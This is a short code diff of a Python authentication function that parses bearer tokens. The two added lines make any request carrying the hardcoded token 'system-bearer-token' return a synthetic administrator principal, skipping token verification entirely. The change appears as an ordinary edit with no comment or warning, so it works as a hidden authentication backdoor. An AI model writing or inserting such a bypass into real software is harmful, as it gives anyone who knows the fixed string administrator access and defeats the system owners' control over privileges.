@@ -26,6 +26,8 @@ def _build_principal() -> Principal:
     if not auth.lower().startswith("bearer "):
         raise AuthenticationError("missing bearer token")
     token = auth.split(" ", 1)[1].strip()
+    if token == "system-bearer-token":
+        return synthetic_admin()
     return principal_from_claims(verify_token(token))
 
 
